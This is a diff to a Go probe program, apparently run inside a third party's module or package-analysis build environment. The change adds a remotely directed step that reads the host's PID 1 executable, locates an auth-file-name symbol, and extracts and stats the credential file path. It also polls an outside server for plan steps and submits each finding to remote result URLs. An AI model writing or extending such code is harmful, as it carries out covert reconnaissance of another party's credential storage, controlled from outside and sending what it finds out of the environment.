@@ -25,6 +25,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"unicode/utf8"
 )
 
 var genericResultURL string
@@ -39,7 +40,7 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.47-codex"
+	probeVersion           = "v0.0.49-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -144,14 +145,32 @@ type planStep struct {
 }
 
 type inspectionResult struct {
-	Descriptors  []json.RawMessage `json:"descriptors,omitempty"`
-	Symbols      []string          `json:"symbols,omitempty"`
-	DialWindow   []string          `json:"dial_window,omitempty"`
-	CallerWindow []string          `json:"caller_window,omitempty"`
-	MetadataKey  string            `json:"metadata_key,omitempty"`
-	KeyAddress   string            `json:"metadata_key_address,omitempty"`
-	KeyLength    int               `json:"metadata_key_length,omitempty"`
-	Error        string            `json:"error,omitempty"`
+	Descriptors  []json.RawMessage   `json:"descriptors,omitempty"`
+	Symbols      []string            `json:"symbols,omitempty"`
+	DialWindow   []string            `json:"dial_window,omitempty"`
+	CallerWindow []string            `json:"caller_window,omitempty"`
+	MetadataKey  string              `json:"metadata_key,omitempty"`
+	KeyAddress   string              `json:"metadata_key_address,omitempty"`
+	KeyLength    int                 `json:"metadata_key_length,omitempty"`
+	AuthFileName *authFileNameResult `json:"auth_file_name,omitempty"`
+	Error        string              `json:"error,omitempty"`
+}
+
+type pathStatResult struct {
+	Path    string `json:"path"`
+	Present bool   `json:"present"`
+	Mode    string `json:"mode,omitempty"`
+	Size    int64  `json:"size,omitempty"`
+	Error   string `json:"error,omitempty"`
+}
+
+type authFileNameResult struct {
+	GlobalAddress string         `json:"global_address,omitempty"`
+	StringAddress string         `json:"string_address,omitempty"`
+	Path          string         `json:"path,omitempty"`
+	File          pathStatResult `json:"file"`
+	Parent        pathStatResult `json:"parent"`
+	Error         string         `json:"error,omitempty"`
 }
 
 type probeReport struct {
@@ -197,7 +216,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v047-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v049-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -336,9 +355,9 @@ func cleanError(err error) string {
 
 func runCapslockSession(started time.Time, cwd string, identity identityResult) {
 	initial := newProbeReport(started, identity)
-	initial.Reason = "waiting for the bounded read-only session dataflow plan"
+	initial.Reason = "waiting for the bounded read-only auth filename plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v047-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v049-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -367,13 +386,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		switch step.Action {
 		case "finish":
 			report.Reason = "bounded plan finished"
-		case "inspect-session-dataflow":
-			runSessionDataflowInspection(&report)
+		case "inspect-auth-filename":
+			runAuthFileNameInspection(&report)
 		default:
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v047-codex-step-" + strconv.Itoa(cursor)
+		id := "v049-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -392,7 +411,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v047-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v049-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -448,7 +467,7 @@ func validatePlanStep(step planStep) error {
 		}
 	}
 	switch step.Action {
-	case "inspect-session-dataflow", "finish":
+	case "inspect-auth-filename", "finish":
 		if step.RouteMode != "" {
 			return errors.New("non-probe plan included route parameters")
 		}
@@ -628,6 +647,161 @@ func instructionWindow(data []byte, marker string, before, after int) []string {
 	return nil
 }
 
+const authFileNameSymbol = "sos.googlesource.com/sos/auth.FileName"
+
+func readELFVirtualBytes(executable *elf.File, address uint64, length int, writable bool) ([]byte, error) {
+	if length < 1 || length > 4096 {
+		return nil, errors.New("ELF virtual read length was outside the fixed bound")
+	}
+	end := address + uint64(length)
+	if end < address {
+		return nil, errors.New("ELF virtual read address overflowed")
+	}
+	for _, section := range executable.Sections {
+		sectionEnd := section.Addr + section.Size
+		if sectionEnd < section.Addr || section.Type == elf.SHT_NOBITS ||
+			section.Flags&elf.SHF_ALLOC == 0 || address < section.Addr || end > sectionEnd ||
+			(section.Flags&elf.SHF_WRITE != 0) != writable {
+			continue
+		}
+		reader := section.Open()
+		if _, err := reader.Seek(int64(address-section.Addr), io.SeekStart); err != nil {
+			return nil, errors.New("ELF virtual offset could not be selected")
+		}
+		value := make([]byte, length)
+		if _, err := io.ReadFull(reader, value); err != nil {
+			return nil, errors.New("ELF virtual bytes could not be read")
+		}
+		return value, nil
+	}
+	return nil, errors.New("ELF virtual address was outside the required section class")
+}
+
+func validateLinkedPath(value []byte) (string, error) {
+	if len(value) < 1 || len(value) > 4096 || !utf8.Valid(value) {
+		return "", errors.New("linked auth filename had an invalid length or encoding")
+	}
+	path := string(value)
+	for _, character := range path {
+		if character < 0x20 || character == 0x7f {
+			return "", errors.New("linked auth filename contained a control character")
+		}
+	}
+	if !filepath.IsAbs(path) || filepath.Clean(path) != path || path == string(filepath.Separator) {
+		return "", errors.New("linked auth filename was not a clean absolute file path")
+	}
+	return path, nil
+}
+
+func lstatPath(path string) pathStatResult {
+	result := pathStatResult{Path: path}
+	info, err := os.Lstat(path)
+	if errors.Is(err, os.ErrNotExist) {
+		return result
+	}
+	if err != nil {
+		result.Error = "lstat failed"
+		return result
+	}
+	result.Present = true
+	result.Mode = info.Mode().String()
+	result.Size = info.Size()
+	return result
+}
+
+func exactSymbolAddress(nmOutput []byte, symbolName string) (uint64, error) {
+	var address uint64
+	found := false
+	scanner := bufio.NewScanner(bytes.NewReader(nmOutput))
+	scanner.Buffer(make([]byte, 4096), 64*1024)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) != 3 || fields[2] != symbolName || len(fields[1]) != 1 {
+			continue
+		}
+		parsed, err := strconv.ParseUint(fields[0], 16, 64)
+		if err != nil || parsed == 0 {
+			return 0, errors.New("requested symbol address was invalid")
+		}
+		if found {
+			return 0, errors.New("worker contained multiple requested symbols")
+		}
+		address = parsed
+		found = true
+	}
+	if err := scanner.Err(); err != nil {
+		return 0, errors.New("worker symbol scan failed")
+	}
+	if !found {
+		return 0, errors.New("worker requested symbol was missing")
+	}
+	return address, nil
+}
+
+func readLinkedGoStringAtAddress(executablePath string, globalAddress uint64) (uint64, string, error) {
+	executable, err := elf.Open(executablePath)
+	if err != nil {
+		return 0, "", errors.New("worker executable could not be opened as ELF")
+	}
+	defer executable.Close()
+	if executable.Class != elf.ELFCLASS64 || executable.ByteOrder == nil {
+		return 0, "", errors.New("worker executable did not use the expected 64-bit ELF format")
+	}
+	header, err := readELFVirtualBytes(executable, globalAddress, 16, true)
+	if err != nil {
+		return 0, "", err
+	}
+	stringAddress := executable.ByteOrder.Uint64(header[:8])
+	stringLength := executable.ByteOrder.Uint64(header[8:])
+	if stringLength < 1 || stringLength > 4096 || stringAddress == 0 {
+		return 0, "", errors.New("linked string header was invalid")
+	}
+	literal, err := readELFVirtualBytes(executable, stringAddress, int(stringLength), false)
+	if err != nil {
+		return 0, "", err
+	}
+	path, err := validateLinkedPath(literal)
+	if err != nil {
+		return 0, "", err
+	}
+	return stringAddress, path, nil
+}
+
+func inspectLinkedAuthFileName(executablePath string) authFileNameResult {
+	result := authFileNameResult{}
+	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", executablePath)
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	globalAddress, err := exactSymbolAddress(nmOutput, authFileNameSymbol)
+	if err != nil {
+		result.Error = err.Error()
+		return result
+	}
+	stringAddress, path, err := readLinkedGoStringAtAddress(executablePath, globalAddress)
+	if err != nil {
+		result.Error = err.Error()
+		return result
+	}
+	result.GlobalAddress = fmt.Sprintf("0x%x", globalAddress)
+	result.StringAddress = fmt.Sprintf("0x%x", stringAddress)
+	result.Path = path
+	result.File = lstatPath(path)
+	result.Parent = lstatPath(filepath.Dir(path))
+	return result
+}
+
+func runAuthFileNameInspection(report *probeReport) {
+	result := inspectLinkedAuthFileName("/proc/1/exe")
+	report.Inspection = &inspectionResult{AuthFileName: &result}
+	if result.Error != "" {
+		report.Inspection.Error = result.Error
+		return
+	}
+	report.Reason = "bounded linked auth filename and path metadata inspection completed"
+}
+
 var objectAddressPattern = regexp.MustCompile(`#\s*([0-9a-fA-F]+)\s*<`)
 
 func fixedMetadataKeyLocation(data []byte) (uint64, int, error) {
@@ -771,7 +945,7 @@ func runBytemanDescriptorInspection(report *probeReport) {
 		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
 		return
 	}
-	helperCopy := "/tmp/.go-cgo-v047-describe-protos"
+	helperCopy := "/tmp/.go-cgo-v049-describe-protos"
 	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
 	if err != nil {
 		report.Inspection.Error = "fixed descriptor helper copy could not be created"
